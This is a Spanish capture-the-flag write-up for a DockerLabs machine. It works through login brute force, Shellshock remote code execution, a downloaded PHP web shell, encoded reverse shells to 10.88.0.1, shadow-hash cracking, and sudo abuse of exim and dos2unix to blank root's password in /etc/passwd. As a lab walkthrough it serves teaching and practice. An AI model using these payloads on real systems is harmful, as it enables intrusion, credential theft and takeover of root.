#DockerLabs #WriteUps #Hacking

>[!NOTE] Habilidades: 
> Brute Force Attack (Login Page),  ShellShock Remote Code Execution, User Shadow Hash Cracking using John, Bash `-eq` Comparison Privilege Escalation, Exim using Privilege escalation (Sudo), Dos2unix Privilege Escalation abusing Write Permissions (Sudo) 

## Lanzar el laboratorio

Para desplegar el laboratorio de `docker` que estaremos explotando, ejecutaremos los siguientes comandos

~~~ bash
# Descomprimimos el archivo
unzip bruteshock.tar

# Asignamos permisos de ejecución al script que despliega el laboratorio
chmod +x auto_deploy.sh

# Lanzamos el laboratorio
./auto_deploy.sh bruteshock.tar
~~~

![[Pasted image 20241105091157.png]]

Se nos muestra la dirección IP de la máquina víctima que en este caso es `10.88.0.3`, si tu máquina usa `docker` deberías ver la dirección `172.17.0.2`

Docker generalmente asigna la dirección de red `172.17.0.0` como dirección de red, pero en este caso estamos usando `podman`, es por eso la diferencia

![[Pasted image 20241105091651.png]]

En mi caso trabajaré con el dominio `bruteshock.local`, que lo agregué a mi archivo `/etc/hosts` para mayor comodidad

## Ping

~~~ bash
ping -c1 bruteshock.local
~~~

![[Pasted image 20241105091717.png]]


# Reconocimiento
---
## Nmap 

Haremos un primer escaneo por el protocolo TCP, con el fin de descubrir puertos abiertos, si no encontráramos información relevante, haríamos escaneos por otros protocolos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -v bruteshock.local -oG openPorts
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grep`
- `-v`: Mostrar la información en tiempo real

![[Pasted image 20241105091926.png]]

Ahora haremos un escaneo de servicios para detectar la versión y el tipo de servicio que se ejecuta en los puertos que hemos encontrado

~~~ bash
nmap -sVC -p 80 bruteshock.local -oN services
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: uso de scripts de reconocimiento para identificar posibles vulnerabilidades conocidas
- `-oN`: Exportar en formato `nmap` (se vea igual que el output de nmap)

![[Pasted image 20241105092420.png]]

## Whatweb

~~~ bash
whatweb http://bruteshock.local
~~~

Usaremos la herramienta `whatweb` para detectar las tecnologías que se están ejecutando en el servidor web

![[Pasted image 20241105092705.png]]

Nos reporta un error `403`, esto quiere decir que no estamos autorizados a ver el contenido. Si visitamos la web a primera vista no vemos gran cosa, hasta que recargamos y nos muestra una web supuestamente privada

![[Pasted image 20241105092844.png]]

![[Pasted image 20241105093652.png]]

Esto ocurre porque se cuando iniciamos por primera vez no nos carga la cookir `cookie` de PHP (`PHPSESSID`) 

![[Pasted image 20241105093949.png]]

Entonces si usamos la cookie que nos proporcionó en el navegador, ahora tendremos acceso al contenido

![[Pasted image 20241105093523.png]]

## Fuzzing

Primeramente haremos `fuzzing` para descubrir directorios o archivos interesantes, lo haremos con la herramienta `wfuzz`

~~~ bash
wfuzz -c --hc=404 -H "Cookie: PHPSESSID=p94n4hgjjvq1ti9f7relhhdh06" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://bruteshock.local/FUZZ
~~~

- `-c`: Formato colorizado
- `--hc=404`: Ocultamos las respuestas con el código de estado `404`
- `-H`: Definir una cabecera `HTTP`, en este caso es necesario enviar el valor de la `cookie` de sesión 
- `-w`: Diccionario de palabras a usar
- `-t 200`: Definimos 200 subprocesos para agilizar el proceso de `fuzzing`

![[Pasted image 20241106000133.png]]

Pero no obtendremos resultados interesantes, en este punto podemos intentar hacer un ataque de fuerza bruta para intentar descubrir alguna contraseña en el `login`

# Explotación
---
## Brute Force

Intentaremos encontrar la contraseña de un usuario `admin` a través de un ataque de fuerza bruta al panel de autenticación usando `wfuzz`

~~~ bash
wfuzz -c --hl 69 -H "Cookie: PHPSESSID=p94n4hgjjvq1ti9f7relhhdh06" -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -t 200 http://bruteshock.local/
~~~

- `--hl 69`: Ocultamos las respuestas con `69` líneas
- `-H`: Especificamos una cabecera HTTP
- `-d`: Definimos el contenido de los datos que enviaremos

En este caso, cada respuesta fallida posee un total de `69` líneas y un código de estado exitoso (`200`), es por eso que en vez de filtrar por código de estado, filtramos por la cantidad de líneas

![[Pasted image 20241105103223.png]]

En este caso hemos encontrado una contraseña `christelle` supuestamente válida para el usuario `admin`. Si iniciamos sesión, nos salta este recuadro con un mensaje del éxito

![[Pasted image 20241105103330.png]]

Nos redirige a este nuevo panel con la URL `http://bruteshock.local/pruebasUltraSecretas`

![[Pasted image 20241105103408.png]]

Podemos ver que nos reporta un mensaje que dice: `User-Agent almacenado en el log`, lo que nos puede ayudar en nuestra explotación

## ShellShock

Pensé que esta explotación sería algo sobre envenenamiento hasta que me acordé del nombre de la máquina, se trataría de `Shellshock`. Este es un ataque que se lleva a cabo a través de la cabecera `User-Agent` , un bug de `bash` que permite la ejecución remota de comandos, una detección para esta máquina sería la siguiente

![[Pasted image 20241105222724.png]]

## Proof of Concept

Ejecutamos esta solicitud `http` para la URL `http://bruteshock.local/pruebasUltraSecretas`

~~~ bash
curl -I -sLX GET http://bruteshock.local/pruebasUltraSecretas/ -A "() { :; }; curl http://10.88.0.1/test"
~~~

![[ShellShock PoC.mp4]]

Aprovecha el bug Willy!. En el ejemplo anterior estaríamos intentando enviarnos una solicitud HTTP a nuestro servidor `python3`. Es cuando el payload se ejecuta correctamente y envía un `request` a nuestro servidor solicitando un archivo `test`

## File Upload

Aprovechando este bug podremos enviar una `reverse shell` a nuestra máquina atacante, para ello crearemos un archivo que usaremos para ejecutar comandos, nos ayudaremos de `Brupsuite` o `curl`

Archivo `rce.php`
 
~~~ bash
echo '<?php system($_GET["cmd"]); ?>' > rce.php
~~~

Modificaremos el `User-Agent` y enviaremos la siguiente solicitud, pero primero tendremos un servidor HTTP con `python3`

![[Pasted image 20241105231701.png]]

### Burpsuite

En `Burpsite` interceptaremos el tráfico y enviaremos la siguiente solicitud

~~~ bash
() { :; }; curl http://10.88.0.1/rce.php -o exec.php
~~~

![[Pasted image 20241105231020.png]]

### Curl

~~~ bash
curl -I -sLX GET http://bruteshock.local/pruebasUltraSecretas/ -A "() { :; }; curl http://10.88.0.1/rce.php -o exec.php"
~~~

En nuestro servidor que iniciamos con `python` deberíamos ver un `GET` a nuestro archivo `rce.php`

![[Pasted image 20241105231215.png]]


## Remote Code Execution

Ahora mediante la web accedemos al archivo `rce.php`, podemos hacerlo o bien desde la web o mediante `curl`

~~~ bash
curl -X GET http://bruteshock.local/pruebasUltraSecretas/exec.php\?cmd=id
~~~

![[Pasted image 20241105231441.png]]

![[Pasted image 20241105131749.png]]

## Reverse Shell

Podemos intentar enviarnos una `shell` mediante este parámetro, para ello modificaremos el siguiente payload

~~~ bash
bash -c "bash -i >&/dev/tcp/10.88.0.1/443 0>&1"
~~~

![[Pasted image 20241105232028.png]]

Nota que cambié el caracter `&` por `%26` para que pueda ejecutarse correctamente en el servidor

![[Pasted image 20241105231953.png]]

Si entramos de esta forma al poco tiempo de establecer la `shell`, nos concluye la conexión, esto puede ser porque el servidor está bloqueando ciertos tipos de conexiones

Usaremos una `reverse shell` con `php` para no depender de un TTY, el comando sería el siguiente

~~~ bash
php -r '$sock=fsockopen("10.88.0.1",4444);exec("/bin/bash -i <&2 >&3 2>&4");'
~~~

Pero tampoco podremos ejecutarlo directamente, es por eso que una opción sería usar `base64` para primero decodificar la `shell` y luego interpretarla en el servidor

~~~ bash
echo "cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjg4LjAuMSIsNDQ0NCk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA+JjMgMj4mMyIpOyc=" | base64 -d | bash
~~~

**Hagamos unas pruebas antes de establecer la `shell`, primero necesitamos entender que debemos modificar la URL para que nuestra explotación pueda acontecerse**

- Nota que en medio de la cadena en `base64` que hay un caracter (`+`) que limita nuestra  ejecución, es por eso que **debemos reemplazarlo** con `%2B`, que es su traducción en `Url Encoding`

**Ejecutaremos el comando sin aplicar `| bash` para ver el contenido de la cadena que se decodifica**

`Antes`

~~~ bash
cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjg4LjAuMSIsNDQ0NCk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA+JjMgMj4mMyIpOyc=
~~~

![[Pasted image 20241105234140.png]]


`Después`

~~~ bash
cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjg4LjAuMSIsNDQ0NCk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA%2BJjMgMj4mMyIpOyc=
~~~

![[Pasted image 20241105234108.png]]

Ahora con este pequeño cambio deberíamos poder establecer una `shell` sin problemas

~~~ bash
http://bruteshock.local/pruebasUltraSecretas/exec.php?cmd=echo%20%22cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjg4LjAuMSIsNDQ0NCk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA%2BJjMgMj4mMyIpOyc=%22%20|%20base64%20-d%20|%20bash
~~~

![[Pasted image 20241105234657.png]]



# Escalada de privilegios
---
## Tratamiento TTY

Haremos el típico tratamiento de la TTY para operar de una forma más cómoda y poder hacer `Ctrl + C` y `Ctrl + L`

~~~ bash
export TERM=xterm
export SHELL=/bin/bash
script /dev/null -c bash
^Z

stty raw -echo;fg
reset xterm
~~~

![[Pasted image 20241105233905.png]]

Finalmente ajustamos las proporciones al tamaño de la terminal para poder tener una visualización más cómoda

~~~ bash
stty rows 44 columns 189
~~~

## Sudo

Listaremos los privilegios que tengamos asignados con `sudo` para ver si tenemos capacidad para ejecutar un archivo

![[Pasted image 20241105174242.png]]

Nos pide la contraseña del usuario `www-data`, pero como no la tenemos, seguiremos buscando otra forma de escalar

## SUID Binaries

Listaremos aquellos binarios los cuales tengan asignado el permiso `suid` asignado

![[Pasted image 20241105174333.png]] 

Vemos que existe `exim4`, pero esta versión no sería vulnerable a algún `CVE` reportado. Iremos a la carpeta `/home` para ver si podemos ver el contenido de algún usuario

![[Pasted image 20241105174555.png]]

Existe un script de `bash` llamado `script.sh` en la carpeta del usuario `maci`, y al parecer podemos ejecutarlo

## Bash `-eq`

Existe una forma de escalar privilegios mediante el uso de la comparación `-eq` de `bash`, donde el uso de doble corchetes permite inyectar un comando (`[[ $num -eq 123123 ]]`)

![[Pasted image 20241105174829.png]]

Para aprovechar esto y escalar privilegios, usaremos el siguiente comando

~~~ bash
sudo -u maci ./script.sh
~~~

- `-u`: Ejecutamos el comando como el usuario `maci`

Cuando nos pida adivinar pegaremos lo siguiente

- `a[$(/bin/bash >&2)]+42`

![[Pasted image 20241105212308.png]]

No nos es posible escalar nuestros privilegios usando este método, así que buscaremos otras formas para migrar a otro usuario

## File Discovery

Buscaremos archivos en el sistema cuyo miembro sea cada usuario en cuestión

~~~ bash
find / -user "darksblack" -readable 2>/dev/null
~~~

- `-user`: Usuario propietario
- `-readable`: Capacidad de lectura

![[Pasted image 20241105175226.png]]

Si inspeccionamos el archivo vemos lo siguiente

~~~ bash
cat /var/backups/darksblack/.darksblack.txt
~~~

![[Pasted image 20241105175834.png]]

## John (cracking shadow hash)

Parece ser el `hash` del archivo `/etc/shadow` para el usuario `darksblack`, intentaremos crackear este hash usando la herramienta `john`

~~~ bash
john --format=crypt--wordlist=/usr/share/wordlist/rockyou.txt hash.txt
~~~

- `--format=crypt`: Detectar el algoritmo usado de forma automática para Unix
- `--wordlist`: Especificamos el diccionario a usar para crackear el hash

![[Pasted image 20241105180828.png]]

## Darksblack

Hemos encontrado la contraseña `salvador1` para el usuario `darksblack`, por lo que ya podemos migrar a este usuario

~~~ bash
su darksblack
~~~

![[Pasted image 20241105182658.png]]

## Sudo `script.sh`

Inicialmente comprobaremos los privilegios `sudo` para este nuevo usuario

~~~ bash
sudo -l
~~~

![[Pasted image 20241105182620.png]]

Podemos ejecutar el `script.sh` que descubrimos anteriormente, por lo que ahora intentamos elevar nuestro privilegio usando `sudo`

~~~ bash
sudo -u maci ./script.sh
~~~

`Payload`

~~~ bash
a[$(/bin/sh >&2)]+42
~~~

![[Pasted image 20241105183521.png]]

Para volver a una `bash`, simplemente escribimos `bash`

## Sudo `exim`

Listaremos los privilegios `sudo` que tenemos asignados para el usuario actual

~~~ bash
sudo -l
~~~

![[Pasted image 20241105183719.png]]

Podemos ejecutar `exim` como el usuario `pepe`, por lo que podemos intentar ejecutar `bash` como este usuario, para ejecutar algún comando a través de `exim`, podemos hacerlo mediante el siguiente comando

~~~ bash
exim -be '${run{/usr/bin/id}}'
~~~

![[Pasted image 20241105184456.png]]

Intentamos migrar al usuario `pepe` con `sudo`

~~~ bash
echo '#!/bin/bash' > /tmp/privesc && echo "echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHB0eTtpbXBvcnQgc29ja2V0LG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjg4LjAuMSIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL2Jhc2giKSc=' | base64 -d | bash" >> /tmp/privesc
~~~ 

![[Pasted image 20241105203456.png]]

Antes de lanzar la `shell` le damos permisos de ejecución al `script`

~~~ bash
chmod +x /tmp/privesc
~~~

## Shell

Nos ponemos en escucha con `nc` por el puerto `443` para recibir la `shell`

~~~ bash
nc -lvnp 443
~~~

## Pepe

Ejecutamos la reverse shell de la siguiente forma

~~~ bash
sudo -u pepe exim -be '${run{/bin/bash -c "/tmp/privesc"}}'
~~~

![[Pasted image 20241105203354.png]]

Y estaríamos conectados como el usuario `pepe`, ahora finalmente nos queda escalar a `root`

![[Pasted image 20241105203659.png]]

## Tratamiento TTY

Hacemos un tratamiento de la TTY para poder hacer `Ctrl + C` y `Ctrl + L`

~~~ bash
export TERM=xterm

script /dev/null -c bash
^Z

stty raw -echo;fg
reset xterm
/bin/bash
stty columns 189 rows 44
~~~

![[Pasted image 20241105204545.png]]

## Sudo `dos2unix`

Listaremos nuestros privilegios `sudo` para ver si tenemos acceso a un recurso nuevo el cual podamos explotar para elevar nuestros privilegios

~~~ bash
sudo -l
~~~

![[Pasted image 20241105205458.png]]

Tenemos capacidad de ejecutar `dos2unix` sin proporcionar contraseña. Con la capacidad de escritura de archivos con `dos2unix`, podemos llevar a cabo una escalada de privilegios mediante una escritura privilegiada

![[Pasted image 20241105204818.png]]

Usaremos el contenido de `/etc/passwd` para nuestra escalada, primeramente hacemos una copia del `/etc/passwd` en algún directorio como `/tmp`

~~~ bash
cat /etc/passwd > /tmp/passwd
~~~

**Ahora necesitamos que la línea del archivo donde se encuentra `root` esté sin la letra `x`, al eliminar la "x" en el campo de contraseña de `root`, indicaríamos al sistema que `root` no tiene contraseña almacenada en `/etc/shadow`. Esto dejaría la cuenta `root` accesible sin contraseña**

![[Pasted image 20241105210916.png]]

Entonces modificamos el archivo que acabamos de crear

~~~ bash
nano /tmp/passwd
~~~

![[Pasted image 20241105211157.png]]

## Root time

Ahora preparamos el entorno para usar ambos archivos en nuestra escalada de privilegios

~~~ bash
passwd_new=/tmp/passwd
passwd_old=/etc/passwd
~~~

![[Pasted image 20241105211934.png]]

Ejecutamos `dos2unix` con `sudo` y usando ambos archivos

~~~ bash
sudo /usr/bin/dos2unix -f -n "$passwd_new" "$passwd_old"
~~~

![[Pasted image 20241105211802.png]]

Finalmente cambiamos al usuario `root` con el comando `su`

~~~ bash
su root
~~~

![[Pasted image 20241105211822.png]]


